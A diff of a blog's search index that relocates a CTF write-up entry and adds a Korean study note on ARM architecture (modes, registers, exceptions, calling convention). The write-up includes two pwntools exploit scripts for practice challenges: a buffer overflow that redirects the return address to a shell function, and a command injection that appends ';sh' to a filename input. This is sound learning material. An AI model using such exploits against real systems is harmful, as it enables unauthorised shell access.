@@ -59,36 +59,6 @@
       </tags>
   </entry>
   <entry>
-    <title>2020 X-mas CTF </title>
-    <url>/2020/12/24/2020-12-25-XMAS_CTF_2020/</url>
-    <content><![CDATA[<center>2020 X-mas CTF Write-up </center>
-
-
-<h1 id="Baby-Rudolph-pwnable"><a href="#Baby-Rudolph-pwnable" class="headerlink" title="Baby_Rudolph (pwnable)"></a>Baby_Rudolph (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/110240519-b180ef00-7f8f-11eb-96e2-089f6ad9c54f.png" alt="image"></p>
-<p>There is Buffer Overflow in <code>vuln function</code>. It is triggered by calling <code>read</code>.</p>
-<p><img src="https://user-images.githubusercontent.com/49066484/110240604-189ea380-7f90-11eb-9a28-53016a34540e.png" alt="image"></p>
-<p>And Using <code>get_arm</code> function, we can get the sh. So it is easy bof. just overwrite retur address to <code>get_arm</code>.</p>
-<span id="more"></span>
-<p><img src="https://user-images.githubusercontent.com/49066484/110240678-6f0be200-7f90-11eb-9e34-da677cef49ef.png" alt="image"></p>
-<p>We need ARM, because the binary  is for ARM architecture. So They gave docker. but it didn’t work. I used qemu for constructing  analysis environment.<br><code>/usr/bin/qemu-system-aarch64 -M virt -cpu cortex-a57 -m 128 -kernel ./kernel -initrd ./rootfs -nographic -serial mon:stdio -append console=ttyAMA0</code></p>
-<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;host7.dreamhack.games&#x27;</span>,<span class="number">17341</span>)</span><br><span class="line">get_arm = <span class="number">0x400680</span></span><br><span class="line">argv = <span class="number">0x1225</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;\x90&#x27;</span>*<span class="number">72</span></span><br><span class="line">payload += p64(get_arm)</span><br><span class="line">payload += p64(argv)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ARM...!\N&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Oil-System-pwnable"><a href="#Oil-System-pwnable" class="headerlink" title="Oil_System (pwnable)"></a>Oil_System (pwnable)</h1><h2 id="vulnerability-1"><a href="#vulnerability-1" class="headerlink" title="vulnerability"></a>vulnerability</h2><p>It opens the file with the name I entered. and also it uses <code>System</code> function when it opens the file.<br>(ex Syste(/home/~~))</p>
-<p><img src="https://user-images.githubusercontent.com/49066484/110240852-36b8d380-7f91-11eb-8288-3655ddfe0783.png" alt="image"></p>
-<p>When i entered the name, It called <code>check_upper_lower</code>function. But it only check whether the first character is lowercase or not. It means the name can contain <code>;</code> or <code>|</code> after first character. So we can use <code>command injection</code>.  if i  enter the name as A;/bin/sh, can get the sh.</p>
-<h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./oil&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Name : &#x27;</span> , <span class="string">&#x27;aa;sh&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Code : &#x27;</span>, <span class="string">&#x27;1 2 3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Write-up</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>pwnable</tag>
-        <tag>write-up</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CVE-2018-8453</title>
     <url>/2020/12/02/2020-12-03-CVE-2018-8453/</url>
     <content><![CDATA[<center>CVE-2018-8453 // Windows Kernel 1-day</center> 
@@ -161,6 +131,36 @@
         <tag>Windows Kernel</tag>
         <tag>UAF</tag>
         <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2020 X-mas CTF </title>
+    <url>/2020/12/24/2020-12-25-XMAS_CTF_2020/</url>
+    <content><![CDATA[<center>2020 X-mas CTF Write-up </center>
+
+
+<h1 id="Baby-Rudolph-pwnable"><a href="#Baby-Rudolph-pwnable" class="headerlink" title="Baby_Rudolph (pwnable)"></a>Baby_Rudolph (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/110240519-b180ef00-7f8f-11eb-96e2-089f6ad9c54f.png" alt="image"></p>
+<p>There is Buffer Overflow in <code>vuln function</code>. It is triggered by calling <code>read</code>.</p>
+<p><img src="https://user-images.githubusercontent.com/49066484/110240604-189ea380-7f90-11eb-9a28-53016a34540e.png" alt="image"></p>
+<p>And Using <code>get_arm</code> function, we can get the sh. So it is easy bof. just overwrite retur address to <code>get_arm</code>.</p>
+<span id="more"></span>
+<p><img src="https://user-images.githubusercontent.com/49066484/110240678-6f0be200-7f90-11eb-9e34-da677cef49ef.png" alt="image"></p>
+<p>We need ARM, because the binary  is for ARM architecture. So They gave docker. but it didn’t work. I used qemu for constructing  analysis environment.<br><code>/usr/bin/qemu-system-aarch64 -M virt -cpu cortex-a57 -m 128 -kernel ./kernel -initrd ./rootfs -nographic -serial mon:stdio -append console=ttyAMA0</code></p>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;host7.dreamhack.games&#x27;</span>,<span class="number">17341</span>)</span><br><span class="line">get_arm = <span class="number">0x400680</span></span><br><span class="line">argv = <span class="number">0x1225</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;\x90&#x27;</span>*<span class="number">72</span></span><br><span class="line">payload += p64(get_arm)</span><br><span class="line">payload += p64(argv)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ARM...!\N&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Oil-System-pwnable"><a href="#Oil-System-pwnable" class="headerlink" title="Oil_System (pwnable)"></a>Oil_System (pwnable)</h1><h2 id="vulnerability-1"><a href="#vulnerability-1" class="headerlink" title="vulnerability"></a>vulnerability</h2><p>It opens the file with the name I entered. and also it uses <code>System</code> function when it opens the file.<br>(ex Syste(/home/~~))</p>
+<p><img src="https://user-images.githubusercontent.com/49066484/110240852-36b8d380-7f91-11eb-8288-3655ddfe0783.png" alt="image"></p>
+<p>When i entered the name, It called <code>check_upper_lower</code>function. But it only check whether the first character is lowercase or not. It means the name can contain <code>;</code> or <code>|</code> after first character. So we can use <code>command injection</code>.  if i  enter the name as A;/bin/sh, can get the sh.</p>
+<h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./oil&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Name : &#x27;</span> , <span class="string">&#x27;aa;sh&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Code : &#x27;</span>, <span class="string">&#x27;1 2 3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Write-up</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>pwnable</tag>
+        <tag>write-up</tag>
       </tags>
   </entry>
   <entry>
@@ -1426,6 +1426,160 @@
       <tags>
         <tag>algorithm</tag>
         <tag>sorting</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Embedded Recipes_2_ARM을 파헤쳐 보자</title>
+    <url>/2022/03/27/2022-03-28-2_ARM/</url>
+    <content><![CDATA[<ul>
+<li>ARM (Advanced RISC machine)</li>
+<li>CISC(complex instruction set computer)<br>  Micro programming 방식 : 기계어 하나를 실행하기 위해 많은 양의 작은 micro instruction들이 숨어서 실행</li>
+<li>RISC(Reduced Instruction set computer)<br>  Hard wired 방식 : 기계어 한줄을 실행하기 위하여, 그에 해당하는 노리회로를 구성하여 구현하는 방식. </li>
+</ul>
+<span id="more"></span>
+<h2 id="CISC-vs-RISC"><a href="#CISC-vs-RISC" class="headerlink" title="CISC vs RISC"></a>CISC vs RISC</h2><h3 id="CISC-Complex-Instruction-Set-Computer"><a href="#CISC-Complex-Instruction-Set-Computer" class="headerlink" title="CISC (Complex Instruction Set Computer)"></a>CISC (Complex Instruction Set Computer)</h3><p>하나의 명령어당 최대한 많은 작업을 수행</p>
+<p><img src="https://user-images.githubusercontent.com/49066484/160324775-67400041-6489-41b8-95d0-a8c950ce020e.png" alt="image"></p>
+<ul>
+<li>명령어의 길이가 가변적</li>
+<li>복잡한 기능이 많은 명령어로 구성된 프로세서</li>
+<li>복합 명령을 가짐으로써 하위 호환성을 충분히 확보</li>
+<li>전력소모가 큼, 속도가 느리고 가격이 비쌈</li>
+<li>호환성이 절대적으로 필요한 PC 환경에서 사용</li>
+</ul>
+<h3 id="RISC-Reduced-Instruction-Set-Computer"><a href="#RISC-Reduced-Instruction-Set-Computer" class="headerlink" title="RISC (Reduced Instruction Set Computer)"></a>RISC (Reduced Instruction Set Computer)</h3><p>명령어 하나당 하나의 연산만을 수행</p>
+<p><img src="https://user-images.githubusercontent.com/49066484/160324936-54e18292-7cb6-47da-98f2-239e325252d4.png" alt="image"></p>
+<ul>
+<li>명령어의 길이가 고정적</li>
+<li>하드웨어가 간단한 대신, 소프트웨어가 복잡함.</li>
+<li>전력소모가 적음, 속도가 빠르고 가격이 저렴</li>
+<li>하위 호환을 위해 에뮬레이션 방식을 채택, 호환성 부족</li>
+</ul>
+<h2 id="ARM-mode-and-Thumb-mode"><a href="#ARM-mode-and-Thumb-mode" class="headerlink" title="ARM mode and Thumb mode"></a>ARM mode and Thumb mode</h2><h3 id="Thumb-mode"><a href="#Thumb-mode" class="headerlink" title="Thumb mode"></a>Thumb mode</h3><ul>
+<li>Thumb mode는 ARM mode의 반쪽으로 볼 수 있다.</li>
+<li>처음 32 bit ARM가 나왔을 때, 임베디드 시스템 메모리는 16비트 data line을 가진 메모리가 주 였다. 따라서 32 bit 코어라해도, 메모리를 효율적으로 사용하기 위해서는 16비트 처리가 필요하다.</li>
+</ul>
+<h3 id="ARM의-동작-mode"><a href="#ARM의-동작-mode" class="headerlink" title="ARM의 동작 mode"></a>ARM의 동작 mode</h3><p>User (USR) : Normal Program execution mode<br>System (SYS) : Run privileged operating system tasks<br>Fast Interrupt Request (FIQ) : When a high priority (fast) interrupt is raised<br>Interrupt Request (IRQ) : When a low priority (normal) interrupt is raised<br>Supervisor (SVC) : A protected mode for the operatng system, entered when a SWI instruction is exectued<br>Abort (ABT) : Used to handle memory access violations<br>Undef (UND) : Used to handle undefined instructions</p>
+<ul>
+<li>USR은 Application program을 실행하는 모드.</li>
+<li>SYS는 USR와 비슷하지만, 특권을 가지고 있다는 차이가 있음.</li>
+<li>SVC는 SWI 명령이 발생하면 전환된다. 대부분의 시스템 자원을 자유롭게 관리할 수 있는 모드.</li>
+</ul>
+<h3 id="Privileged-Mode-vs-Normal-mode"><a href="#Privileged-Mode-vs-Normal-mode" class="headerlink" title="Privileged Mode vs Normal mode"></a>Privileged Mode vs Normal mode</h3><ul>
+<li>USR을 제외한 모든 모드는 특권 모드이다.</li>
+</ul>
+<ol>
+<li>특권 모드는 IRQ, FIQ등의 인터럽트의 사용 가능 유무를 직접 설정 할 수 있다.</li>
+<li>특권 모드는 서로 모드 변경이 자유롭게 가능하지만, 일반 모드에서 특권 모드의 변경은 불가능 하다.</li>
+<li>ARM의 기본적인 mode는 SVC모드이다. 부팅시 ARM에 대한 모든 권한을 행사하기 위함.</li>
+</ol>
+<h2 id="ARM-Register"><a href="#ARM-Register" class="headerlink" title="ARM Register"></a>ARM Register</h2><p><img src="https://user-images.githubusercontent.com/49066484/160336597-f44c982e-f2db-41a6-9bcc-af9d64d34fd5.png" alt="image"></p>
+<ul>
+<li>ARM core는 모드가 바뀌면서 사용하는 레지스터 셋도 바뀐다.</li>
+</ul>
+<p><img src="https://user-images.githubusercontent.com/49066484/160337033-88e2b1cc-7060-4502-acf5-065a53712ed9.png" alt="image"></p>
+<ul>
+<li>모든 모드가 공유하는 레지스터는 CPSR, PC, R0~R7</li>
+</ul>
+<h3 id="특별한-용도의-레지스터"><a href="#특별한-용도의-레지스터" class="headerlink" title="특별한 용도의 레지스터"></a>특별한 용도의 레지스터</h3><p>CPSR : Current Program Status Register</p>
+<p><img src="https://user-images.githubusercontent.com/49066484/160337383-9a0e4bbe-b1a9-448a-b1a2-f00a79a32577.png" alt="image"></p>
+<ul>
+<li>NZCV : 연산 후 결과 값에 따라 set 됨.</li>
+<li>IF : IRQ나 FIQ가 걸릴 수 있는지에 관한 필드, 인터럽트에 대한 컨트롤이 가능하다.</li>
+<li>T : Thunmb 모드 set</li>
+<li>mode : 현재 mode를 나타냄. </li>
+</ul>
+<p>SPSR : Saved Program Status Register</p>
+<ul>
+<li>CPSR를 복사해 넣는 특수 레지스터.</li>
+<li>CPSR를 백업하기 위함.</li>
+<li>모드 변경 시 사용.</li>
+</ul>
+<p>R14 : Linked Register (RBP)</p>
+<ul>
+<li>리턴 주소를 담고 있다.</li>
+</ul>
+<p>R13 : Stack Pointer (RSP)</p>
+<ul>
+<li>현재 스택의 꼭대가를 가리킴</li>
+</ul>
+<p>R15 : Program Counter (RIP)</p>
+<ul>
+<li>다음 실행할 명령어를 가리킴.</li>
+<li>현재 Fetch 해 온 위치를 가리킴. (현재 까지 실행된거 X)</li>
+</ul>
+<h3 id="Context-Switching"><a href="#Context-Switching" class="headerlink" title="Context Switching"></a>Context Switching</h3><ul>
+<li>문맥 전환,</li>
+<li>프로세스 실행 중, 인터럽트로 인해 다른 프로세스가 실행될 때</li>
+<li>레지스터 값을 교체하는 작업</li>
+</ul>
+<h2 id="ARM-Exception"><a href="#ARM-Exception" class="headerlink" title="ARM Exception"></a>ARM Exception</h2><ul>
+<li><p>Exception은 Interrupt를 포함한 더 큰 사건,</p>
+</li>
+<li><p>외부 요청, 오류에 관련된 사건.</p>
+</li>
+<li><p>Interrupt : 제어 흐름에서 예상치 못한 외부에서 전달되는 사건.</p>
+</li>
+<li><p>Exception : 프로세서 내부에서 발생하는 예상치 못한 사건.</p>
+</li>
+</ul>
+<h3 id="내부-인터럽트-exception"><a href="#내부-인터럽트-exception" class="headerlink" title="내부 인터럽트 (exception)"></a>내부 인터럽트 (exception)</h3><ul>
+<li>SVC 인터럽트 : 외부의 프로그램이 의도적으로 호출.</li>
+<li>산술 오버플로우/언더플로우</li>
+<li>0 으로 나누기</li>
+<li>정의 안된 명령어 수행</li>
+</ul>
+<h3 id="외부-인터럽트-interrupt"><a href="#외부-인터럽트-interrupt" class="headerlink" title="외부 인터럽트 (interrupt)"></a>외부 인터럽트 (interrupt)</h3><ul>
+<li>I/O 인터럽트 : 입출력 요구가 있을 때 하드웨어가 발생</li>
+<li>전원 이상 인터럽트</li>
+<li>기계 착오 인터럽트 : CPU 등의 기능적 오류</li>
+<li>외부 신호 인터럽트 : Timer등으로 발생.</li>
+</ul>
+<p><img src="https://user-images.githubusercontent.com/49066484/160342208-5cbb9bc9-c6a1-49ca-872f-dac08e406cae.png" alt="image"></p>
+<ul>
+<li>Exception이 발생하면, 그 Exception에 해당하는 미리 정해진 주소의 프로그램을 하드웨어적으로 수행함.</li>
+<li>이 주소를 Exception Vector라 한다.</li>
+</ul>
+<ol>
+<li>SVC mode : SVC 모드는 power on이나 reset이 일어난 경우에 진입한다.</li>
+<li>IRQ mode : 하드웨어적인 인터럽트가 발생하면 진입한다.</li>
+<li>FIQ mode : 인터럽트 중에 Fast 인터럽트가 발생하면 진입한다.</li>
+<li>ABT mode : Access하는 주소가 Access 할 수 없는 경우, 명령어를 Fetch를 못할 경우. 에 진입한다.</li>
+<li>UND mode : 명령어를 해석했는데 ARM이 모르는 명령어일 경우 진입한다. 보통 메모리 커럽션이 나면 발생, &gt; 이를 응용하면 일부러 코드를 삽입하여 UND vector 주소로 jmp하도록 할 수 있음.</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/49066484/160343869-ed3b43b5-dc44-4b89-83bb-34b4399ccc6b.png" alt="image"></p>
+<h3 id="Exception-우선-순위"><a href="#Exception-우선-순위" class="headerlink" title="Exception 우선 순위"></a>Exception 우선 순위</h3><ol>
+<li>Reset</li>
+<li>Data Abort</li>
+<li>FIQ</li>
+<li>IRQ</li>
+<li>Prefetch Abort</li>
+<li>Undefined Instruction</li>
+<li>SWI</li>
+</ol>
+<h3 id="Exception-처리-과정"><a href="#Exception-처리-과정" class="headerlink" title="Exception 처리 과정"></a>Exception 처리 과정</h3><ul>
+<li>Exception이 발생 한 후, 이전 모드로 돌아갈 수 있어야 한다.</li>
+<li>Register 값을 다시 사용할 수 있어야 한다. 이전에 쓰던 Context를 다시 복원할 수 있어야 한다.</li>
+<li>이전 모드로 돌아갔을 때 원래 수행하던 곳으로 돌아갈 수 있어야 한다.</li>
+</ul>
+<p><img src="https://user-images.githubusercontent.com/49066484/160345077-565063a5-7282-4e91-9bfa-fea17214e86f.png" alt="image"></p>
+<h2 id="ARM-Procedure-Call-Standard-함수-호출-규약"><a href="#ARM-Procedure-Call-Standard-함수-호출-규약" class="headerlink" title="ARM Procedure Call Standard (함수 호출 규약)"></a>ARM Procedure Call Standard (함수 호출 규약)</h2><ol>
+<li>함수를 부를 때 레지스터는 어떻게 사용 하는가.</li>
+<li>return 값은 어떻게 돌려 주는가.</li>
+<li>스택은 어떨 때, 어떻게 사용되는가.</li>
+<li>일반적인 레지스터들은 어떻게 사용되는가.</li>
+</ol>
+<p><img src="https://user-images.githubusercontent.com/49066484/160349107-4605d2bc-8d8f-46be-95e8-138aab69444b.png" alt="image"></p>
+<p><img src="https://user-images.githubusercontent.com/49066484/160350245-766e5338-3542-4ec1-8278-18ba4e8715ce.png" alt="image"></p>
+<ul>
+<li>R4 ~ R11을 사용하려면, 스택에 저장 후 사용하고, return시 이전 값을 레지스터에 복원해야 한다.</li>
+</ul>
+]]></content>
+      <categories>
+        <category>EmbeddedSystem</category>
+      </categories>
+      <tags>
+        <tag>Embedded</tag>
+        <tag>ARM</tag>
       </tags>
   </entry>
   <entry>
